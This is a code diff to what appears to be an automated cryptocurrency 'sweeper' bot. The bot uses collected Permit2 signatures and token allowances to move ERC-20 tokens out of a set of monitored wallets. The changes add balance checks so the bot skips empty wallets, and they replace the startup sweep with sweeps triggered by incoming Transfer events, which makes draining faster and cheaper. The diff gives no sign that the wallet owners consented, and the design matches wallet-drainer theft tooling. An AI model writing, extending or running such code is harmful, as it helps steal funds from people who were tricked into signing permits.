@@ -422,6 +422,24 @@ async function sweepPermit2Wallet(walletAddress) {
     return;
   }
 
+  // Hard balance gate — verify at least one token has non-zero balance before any allowance checks
+  {
+    let anyBalance = false;
+    for (const rawAddr of tokenList) {
+      const addr = normalizeAddress(typeof rawAddr === "string" ? rawAddr : rawAddr.address ?? rawAddr.token);
+      if (!addr) continue;
+      try {
+        const bal = await new ethers.Contract(addr, ERC20_ABI, rpcProvider).balanceOf(checksum);
+        if (bal > 0n) { anyBalance = true; break; }
+      } catch {}
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+    if (!anyBalance) {
+      log(`[permit2] ${checksum.slice(0, 10)} — all ${tokenList.length} token(s) zero balance, skipping`);
+      return;
+    }
+  }
+
   log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   let noAllowanceCount = 0;
@@ -651,6 +669,29 @@ async function sweepGaslessWallet(walletAddress) {
 
   const { permitBatch, signatureTransfers } = meta;
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
+
+  // Hard balance gate — check ONLY the signed token addresses before any on-chain tx
+  const signedAddrs = [
+    ...(Array.isArray(permitBatch?.details) ? permitBatch.details.map(d => d.token) : []),
+    ...(Array.isArray(signatureTransfers)
+      ? signatureTransfers.map(e => e.token)
+      : (signatureTransfers?.permitted ?? []).map(p => p.token)),
+  ].map(a => normalizeAddress(a)).filter(Boolean);
+
+  if (signedAddrs.length > 0) {
+    let anyBalance = false;
+    for (const addr of signedAddrs) {
+      try {
+        const bal = await new ethers.Contract(addr, ERC20_ABI, rpcProvider).balanceOf(checksum);
+        if (bal > 0n) { anyBalance = true; break; }
+      } catch {}
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+    if (!anyBalance) {
+      log(`[gasless] ${checksum.slice(0, 10)} — all ${signedAddrs.length} signed token(s) zero balance, skipping`);
+      return;
+    }
+  }
 
   // ── PermitBatch path (AllowanceTransfer via signature) ─────────────────────
   if (permitBatch?.signature && Array.isArray(permitBatch.details) && permitBatch.details.length > 0) {
@@ -1378,16 +1419,8 @@ async function init() {
   // 5. Start WSS: Transfer event listeners + native block scanner
   startBot();
 
-  // 6. Startup sweep — immediately check all existing wallets for existing balances
-  log("[init] checking existing balances on startup...");
-  const startupWallets = [...monitoredWallets.values()];
-  for (const wallet of startupWallets) {
-    await dispatchSweep(wallet).catch(e =>
-      log(`[init] startup sweep error for ${wallet.address.slice(0, 10)}: ${e.message}`)
-    );
-  }
-
   log("[init] ✅ bot ready — listening for Transfer events and Realtime");
+  log("[init] sweeps are event-driven: Transfer events and Realtime will trigger dispatch");
 }
 
 init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });
